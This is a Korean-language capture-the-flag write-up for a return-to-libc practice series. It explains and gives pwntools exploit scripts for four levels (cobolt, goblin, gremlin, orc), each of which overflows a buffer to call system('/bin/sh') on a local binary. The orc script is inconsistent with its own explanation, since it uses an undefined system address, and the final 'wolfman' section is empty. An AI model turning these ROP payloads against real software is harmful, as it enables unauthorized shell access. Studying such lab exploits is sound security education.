# load_of_rtl

## cobolt

You can use write, read, system and /bin/sh  
gdb를 통해 디버깅하여 system_plt = 0x4010b0임을 알 수 있고, pop_rdi 가젯의 주소와 /bin/sh의 주소를 확인할 수 있다.
버퍼의 크기와 dummy, SFP를 덮은 뒤 ret를 pop_rdi 가젯의 주소로 덮는다. pop_rdi 가젯을 활용하면 rdi에 /bin/sh의 주소를 넣은 뒤 system 함수의 plt로 return하여 system("/bin/sh")를 호출하게 된다.


```python
from pwn import *

p = process("./cobolt")

pop_rdi = 0x401353
binsh = 0x404060
system_plt = 0x4010b0

p.recvuntil(b"You can use write, read, system and /bin/sh\n")

payload = b'A'*0x40
payload += b'B'*0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rdi+1)
payload += p64(system_plt)
p.send(payload)

p.interactive()
```


## goblin

  
You can use read and system  
gdb를 통해 디버깅하여 read함수의 주소와 system함수의 주소를 알아낼 수 있다. "/bin/sh" 문자열이 필요하므로 ASLR의 영향을 받지 않는 bss영역에 문자열을 작성해야 한다. read(0,bss,8) 함수를 이용하여 bss영역에 문자열을 작성할 수 있다. 이와 같은 방식으로 RTL을 반복할 수 있다. 이후 system함수의 주소와 "/bin/sh" 주소를 쓰면 함수를 실행할 수 있다.

```python
from pwn import *

p = process("./goblin")

pop_ret = 0x08049022
pop3_ret = 0x08049391
read_plt = 0x80490b0
system_plt = 0x80490e0
bss = 0x804c030 + 0x300
main = 0x80492f3


payload = b'A'*0x44
payload += b'B'*0x4
# bss영역에 /bin/sh 저장
payload += p32(read_plt)
payload += p32(pop3_ret)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
# system 실행
payload += p32(system_plt)
payload += b'C'*0x4
payload += p32(bss)
p.send(payload)

# /bin/sh 보내기
sleep(0.1)
p.send(b"/bin/sh\x00")

p.interactive()
```





## gremlin


You can use write, read, system and /bin/sh  
system("/bin/sh")를 호출하기 위해 system함수의 주소와 "/bin/sh"의 주소를 구한다. ret를 system함수로 덮어주고 esp+0x4 자리에 "/bin/sh"의 주소를 쓰고 사이를 더미값으로 채워주면 system("/bin/sh")를 호출할 수 있다.

```python
from pwn import *

p = process("./gremlin")

system_plt = 0x80490f0
binsh = 0x804c034

# system("/bin/sh") 실행
p.recvuntil(b"You can use write, read, system and /bin/sh\n")
payload = b'A'*0x44
payload += b'B'*0x4
payload += p32(system_plt)
payload += b'C'*0x4
payload += p32(binsh)
pause()
p.send(payload)

p.interactive()
```



## orc 

You can use only read  
read를 사용하여 "/bin/sh"를 bss 영역에 쓸 수 있지만, system함수가 주어지지 않았으므로 라이브러리에서 찾아야 한다. read함수를 사용할 수 있으므로 현재 프로세스에서 libc_base를 구한 뒤 offset을 더하여 system 함수를 사용할 수 있다.

```python
from pwn import *

p = process("./orc")

pop_ret = 0x08049022
pop3_ret = 0x08049391
read_plt = 0x80490b0
bss = 0x804c030 + 0x300
main = 0x80492f3


payload = b'A'*0x44
payload += b'B'*0x4
# bss영역에 /bin/sh 저장
payload += p32(read_plt)
payload += p32(pop3_ret)
payload += p32(0)
payload += p32(bss)
payload += p32(8)




# system 실행
payload += p32(system_plt)
payload += b'C'*0x4
payload += p32(bss)
p.send(payload)

# /bin/sh 보내기
sleep(0.1)
p.send(b"/bin/sh\x00")

p.interactive()

```


## wolfman
